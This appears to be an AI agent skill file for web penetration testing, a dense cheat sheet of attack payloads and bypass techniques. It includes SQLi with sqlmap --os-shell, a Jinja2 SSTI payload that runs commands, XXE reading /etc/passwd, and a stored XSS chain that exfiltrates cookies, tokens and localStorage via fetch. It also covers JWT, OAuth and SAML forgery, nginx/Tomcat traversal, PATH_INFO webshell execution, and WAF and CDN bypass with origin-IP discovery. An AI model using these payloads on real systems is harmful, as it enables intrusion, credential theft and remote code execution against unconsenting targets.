---
name: web-attack-methods
description: >-
  Full-stack Web attacks: SQLi/command injection/SSTI/XSS/SSRF/NoSQL, JWT/OAuth/SAML authentication, LFI/uploads, Tomcat/WS/STOMP/XFF/PATH_INFO/CDN502/WSCN JS-challenge bypass. Use when testing Web injection, auth bypass, server-side, WAF/CDN bypass.
metadata:
  tags: [penetration-testing, penetration-testing, red-team]
---

## Web Attack Methods (injection / authentication / server-side / miscellaneous / CDN)

```
=== Web injection ===
SQLi: sqlmap -u URL --technique=BEUSTQ --risk=3 --level=5 --os-shell | manually test ' OR 1=1-- / ' AND SLEEP(5)--
  Bypass with SEL/**/ECT, case changes, CHAR() | escalate OUTFILE→webshell / xp_cmdshell / UDF
Command injection: ; | && $(cmd) `cmd` %0a | bypass spaces with $IFS, bypass cat with tac/nl | OOB ;nslookup $(whoami).OOB
SSTI: {{7*7}}Jinja2 ${7*7}FreeMarker #{7*7}Ruby | Jinja2 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
XSS: HTML/attribute/JS/href/DOM/SVG | bypass CSP with JSONP/AngularJS CDN | XXE: <!ENTITY xxe SYSTEM "file:///etc/passwd">/"http://OOB/"
🚨Stored XSS via WebSocket/STOMP chat: agent panels in customer-service systems (OCS/LiveChat) commonly render visitor messages with innerHTML/v-html (Vue domProps innerHTML)
  Attack chain: visitor STOMP connection → send a message containing <img src=x onerror=fetch(...)> → agent opens the conversation → XSS executes in the agent browser → steal cookie/token/localStorage
  Key point: the agent browser can usually reach the Internet (not restricted by the backend air gap)! Payload targets: document.cookie + localStorage + fetch(admin API).then(exfil)
  Bypass: messages with mf:1 (visitor identity), tp:0 (text type) go directly to innerHTML; image messages use the url field (<img src>) and do not use innerHTML
SSRF: bypass IPs with 2130706433/[::1]/nip.io/#@ | cloud metadata 169.254.169.254 | Redis gopher://127.0.0.1:6379/_
NoSQL: {"password":{"$ne":""}} / {"$regex":"^a"}

=== Authentication and authorization ===
Authentication bypass: admin'-- | password reset (predictable token/Host-header injection) | MFA bypass (skip/brute-force 4-6 digits) | rotate IP with X-Forwarded-For
IDOR: change resource IDs for horizontal access | mass assignment {"role":"admin","isAdmin":true}
JWT: jwt_tool -X a(alg none/RS256→HS256) | -C weak-key cracking | kid injection | jku/x5u remote keys
401/403 bypass: /admin/ /Admin /%2561dmin /admin;/ /admin..;/ | X-Original-URL/X-Rewrite-URL/X-Forwarded-For:127.0.0.1
OAuth/OIDC: manipulate redirect_uri (replacement/suffix/@ confusion/path traversal) | missing state → CSRF | PKCE downgrade | full JWT attack surface through id_token
SAML: XSW signature wrapping (SAML Raider) | signature stripping | comment truncation admin<!---->@evil | Golden SAML (IdP private key)

=== Server-side ===
LFI: ../../../etc/passwd | php://filter read source | data:// expect:// phar:// | RCE chain: log poisoning/session poisoning/phar deserialization
File upload: shell.php.jpg/.PHP/.php./%00 | change parsing with .htaccess | GIF89a magic bytes | ImageMagick/Ghostscript
🚨Spring Boot Actuator traversal bypasses authentication interceptors: interceptor matches /api/* but actuator is allowlisted → /actuator/../api/v1/endpoint bypasses the interceptor and reaches the protected endpoint
  Principle: Spring Security/custom interceptors match paths before normalization, while Tomcat routes after normalization → traversal bypasses the interceptor but reaches the target Servlet
  Verification: /actuator/health returns 200 (allowlisted) → /actuator/../target also returns 200 (bypass) vs direct /target returns 403/sign is empty (blocked) | /actuator/health/../../target (template path {*path} traversal)
  sign weakness: many custom sign checks only that the header is nonempty (sign:any value+expTime:any number passes) → code:500 instead of "sign is empty" means validation passed | quick check: sign:0 or sign:aaa changing "sign is empty" to 500 means only nonempty is checked
  Escalation: after bypass, combine X-HTTP-Method-Override: POST so a GET request triggers the POST handler (supported by some Spring configurations)

=== Web miscellaneous ===
🚨Tomcat ..;/ bypasses nginx path restrictions: nginx does not parse ; in URLs (treats it as part of the path), while Tomcat treats ..;/ as traversal:
  /api/v1/v/..;/admin/path → nginx matches /api/v1/v/ (allows) → Tomcat parses as /admin/path (traversal!)
  Verification: normal /admin returns nginx 403; /api/v1/v/..;/admin returns Tomcat 404 = bypass succeeded
  Limitation: Spring MVC DispatcherServlet routing is independent of the filesystem; only static files/non-MVC paths in the same WAR are reachable
  Combine with a JSP webshell written by Spring4Shell, or access actuator endpoints
🚨WebSocket/STOMP frame bypass of nginx method restrictions: nginx returns 405 for POST /api/v1/a/login, but STOMP frames are unrestricted after WebSocket upgrade:
  1. GET /api/v1/v/ws/{3-digit}/{8-character random}/websocket → 101 Upgrade (bypass through the visitor path)
  2. STOMP CONNECT → STOMP SEND destination:/app/a/login → reaches the Spring backend directly
  SockJS XHR alternative: POST .../xhr_send sends a STOMP frame (204 = success), with no actual WebSocket required
  Pitfall: the CDN disconnects quickly ("Another connection still open"); a raw socket is more reliable than a websocket library
🚨X-Forwarded-For bypass of the application-layer IP blacklist: the CDN trusts the XFF header, and the application takes the client IP from XFF for blacklist checks:
  Valid: X-Forwarded-For: 1.1.1.1 | X-Forwarded-For: 127.0.0.1, 10.0.0.1
  Invalid: X-Real-IP, X-Client-IP, CF-Connecting-IP, True-Client-IP, Forwarded
  Detection: the response contains {code:10010, msg:"黑名单"} and the data field is your real IP
🚨PATH_INFO nginx deny bypass: nginx denies .php files (returns a 146B nginx 404), but PHP-FPM remains reachable through PATH_INFO:
  /denied/file.php → 404|146 (nginx interception) | /denied/file.php/ → 16B "File not found." (PHP-FPM execution!)
  /denied/file.php/x → same result. PHP-FPM returning "File not found." means the request passed through the nginx deny to PHP-FPM (the script path is simply wrong)
  Exploit: if PHP is configured with cgi.fix_pathinfo=1 (default), /uploads/shell.jpg/x.php → PHP executes shell.jpg! | after confirming it exists, locate the actual FPM docroot (which may differ from nginx)
  Identification: nginx deny returns a fixed size (146B standard 404), while PHP-FPM returns 16B "File not found." → the size difference is the bypass signal
🚨Response-size fingerprinting (hidden-file discovery): a CMS catch-all route returns a fixed-size home page (for example, 44004B), while a real nginx 404 returns 146B
  File exists but is denied: returns 146B (nginx 404) | file does not exist: returns catch-all size (44004B) | → 146B = the file definitely exists!
  Method: batch-scan paths and classify by response size: catch-all = nonexistent, nginx 404 = exists but denied, other sizes = accessible
 WAF bypass decision tree: encoding → protocol level → path → mutation → IP spoofing → smuggling | CORS: Origin reflection + Credentials:true
🚨CDN 502 bypass (URL-pattern filtering): when the CDN returns 502 for an admin path, HTTP encoding/smuggling/method changes are all ineffective → change protocol:
  ①WebSocket upgrade: the CDN usually filters only HTTP responses, so WS paths may not be covered by the filter. /api/v1/a/ws/ returns 200 while /api/v1/a/doLogin returns 502 = the WS path is not filtered
  ②Find and connect directly to the origin IP: historical DNS/Certificate Transparency/SNI scans/same-subnet scans/email Return-Path headers/Shodan fingerprint matches/CDN origin configuration leaks/unique error-page fingerprints → bypass the CDN and connect to the backend
  ③Nonstandard ports: scan all ports on CDN nodes; some may proxy a different backend or use different filtering rules (for example, 8085 exposes actuator)
  ④Path traversal: /api/v1/v/..;/a/doLogin makes Tomcat route to admin, but the CDN may not recognize it (note: the CDN may still filter the response)
  ⑤Wildcard-DNS identification: all subdomains resolve to the CDN = wildcard DNS, not real records. Compare results with 114.114.114.114/8.8.8.8
🚨WSCN/Wangsu CDN JS-challenge identification and bypass: a response containing `_jsc_ch_conf` + `ws_sec_page.js` = a Wangsu JS challenge (not a WAF block)
  Features: cv:".域名",mt:"jhsq987",chType/chTs/chID/chHash fields | 403 page over 6000 bytes containing "Embed Iframe"
  Bypass: the CDN does not challenge specific path allowlist entries (such as /c/) → use Spring Boot ..;/ traversal (`/c/..;/target_path`) to reach other backend routes
  Identify the backend framework: JSON error `{"timestamp":...,"status":...,"error":...,"path":...}` = Spring Boot | 405 = route exists but the method is wrong

=== CDN bypass (target hidden behind CDN, admin API returns 502) ===
CDN 502 analysis: distinguish URL-pattern filtering (fixed timing ~0.3s, every method/encoding/port/node returns 502) from response-content filtering and a dead backend
  Key judgment: if path traversal (`/api/v1/v/..;/a/doLogin`) returns a Tomcat 404, it reached the backend through the CDN; if it returns 502, the CDN intercepted the URL pattern
  nginx 502 vs CDN PWS 502: nginx = edge reverse proxy is down, PWS = CDN-wide policy
```
